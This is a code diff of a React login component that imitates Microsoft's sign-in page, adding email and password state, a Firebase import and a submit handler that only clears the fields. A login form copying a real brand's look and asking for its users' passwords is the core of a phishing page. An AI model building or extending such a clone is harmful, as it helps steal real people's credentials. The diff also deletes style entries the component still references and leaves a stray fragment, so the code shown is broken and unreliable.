@@ -1,6 +1,18 @@
-import React from "react";
+import React, { useState } from "react";
+import app from "./firebase";
 
 const Login = () => {
+  const [form, setForm] = useState({ email: "", password: "" });
+
+  const handleChange = (e) => {
+    setForm({ ...form, [e.target.name]: e.target.value });
+  };
+
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    setForm({ email: "", password: "" }); // Reset form fields
+  };
+
   return (
     <div style={styles.body}>
       <div style={styles.loginContainer}>
@@ -14,7 +26,7 @@ const Login = () => {
           <span style={styles.msText}>Microsoft</span>
         </div>
         <h2 style={styles.heading}>Sign in</h2>
-        <form>
+        <form onSubmit={handleSubmit}>
           <div style={styles.inputGroup}>
             <input
               type="text"
@@ -22,6 +34,8 @@ const Login = () => {
               placeholder="Email, phone, or Skype"
               required
               style={styles.input}
+              value={form.email}
+              onChange={handleChange}
             />
           </div>
           <div style={styles.inputGroup}>
@@ -31,6 +45,8 @@ const Login = () => {
               placeholder="Password"
               required
               style={styles.input}
+              value={form.password}
+              onChange={handleChange}
             />
           </div>
           <div style={styles.links}>
@@ -49,10 +65,11 @@ const Login = () => {
         </form>
         <hr style={styles.divider} />
         <button style={styles.signInOptions}>
-          <svg viewBox="0 0 24 24" style={styles.signInSvg}>
+          <svg width="48" height="48" viewBox="0 0 48 48">
+            <rect width="48" height="48" fill="none" />
             <path
-              fill="#222"
-              d="M9.5 3a1.5 1.5 0 0 1 3 0v1h-3V3zm-5 5A2.5 2.5 0 0 1 7 5.5h10A2.5 2.5 0 0 1 19.5 8v8A2.5 2.5 0 0 1 17 18.5H7A2.5 2.5 0 0 1 4.5 16V8zm2 0v8A.5.5 0 0 0 7 16.5h10a.5.5 0 0 0 .5-.5V8a.5.5 0 0 0-.5-.5H7A.5.5 0 0 0 6.5 8z"
+              fill="#404040"
+              d="M40,32.578V40H32V36H28V32H24V28.766A10.689,10.689,0,0,1,19,30a10.9,10.9,0,0,1-5.547-1.5,11.106,11.106,0,0,1-2.219-1.719A11.373,11.373,0,0,1,9.5,24.547a10.4,10.4,0,0,1-1.109-2.625A11.616,11.616,0,0,1,8,19a10.9,10.9,0,0,1,1.5-5.547,11.106,11.106,0,0,1,1.719-2.219A11.373,11.373,0,0,1,13.453,9.5a10.4,10.4,0,0,1,2.625-1.109A11.616,11.616,0,0,1,19,8a10.9,10.9,0,0,1,5.547,1.5,11.106,11.106,0,0,1,2.219,1.719A11.373,11.373,0,0,1,28.5,13.453a10.4,10.4,0,0,1,1.109,2.625A11.616,11.616,0,0,1,30,19a10.015,10.015,0,0,1-.125,1.578,10.879,10.879,0,0,1-.359,1.531Zm-2,.844L27.219,22.641a14.716,14.716,0,0,0,.562-1.782A7.751,7.751,0,0,0,28,19a8.786,8.786,0,0,0-.7-3.5,8.9,8.9,0,0,0-1.938-2.859A9.269,9.269,0,0,0,22.5,10.719,8.9,8.9,0,0,0,19,10a8.786,8.786,0,0,0-3.5.7,8.9,8.9,0,0,0-2.859,1.938A9.269,9.269,0,0,0,10.719,15.5,8.9,8.9,0,0,0,10,19a8.786,8.786,0,0,0,.7,3.5,8.9,8.9,0,0,0,1.938,2.859A9.269,9.269,0,0,0,15.5,27.281a8.842,8.842,0,0,0,6.469.2A8.767,8.767,0,0,0,24.609,26H26v4h4v4h4v4h4ZM16,14a1.938,1.938,0,0,1,.781.156,2,2,0,0,1,.625.422,2.191,2.191,0,0,1,.438.641A1.705,1.705,0,0,1,18,16a1.938,1.938,0,0,1-.156.781,2,2,0,0,1-.422.625,2.191,2.191,0,0,1-.641.438A1.705,1.705,0,0,1,16,18a1.938,1.938,0,0,1-.781-.156,2,2,0,0,1-.625-.422,2.191,2.191,0,0,1-.438-.641A1.705,1.705,0,0,1,14,16a1.938,1.938,0,0,1,.156-.781,2,2,0,0,1,.422-.625,2.191,2.191,0,0,1,.641-.438A1.705,1.705,0,0,1,16,14Z"
             />
           </svg>
           Sign-in options
@@ -94,22 +111,7 @@ const styles = {
     fontSize: "1.2rem",
     fontWeight: "600",
     color: "#222",
-    letterSpacing: "0.01em",
-  },
-  heading: {
-    fontSize: "1.5rem",
-    fontWeight: "400",
-    margin: "0 0 1.5rem 0",
-    color: "#1b1b1b",
-  },
-  inputGroup: {
-    marginBottom: "0.5rem",
-  },
-  input: {
-    width: "100%",
-    padding: "0.75rem",
-    border: "1px solid #c8c6c4",
-    fontSize: "1rem",
+   
     background: "#faf9f8",
     marginBottom: "0.5rem",
     outline: "none",
@@ -150,6 +152,7 @@ const styles = {
     alignItems: "center",
     justifyContent: "center",
     cursor: "pointer",
+    height: "51px",
   },
   signInSvg: {
     width: "18px",
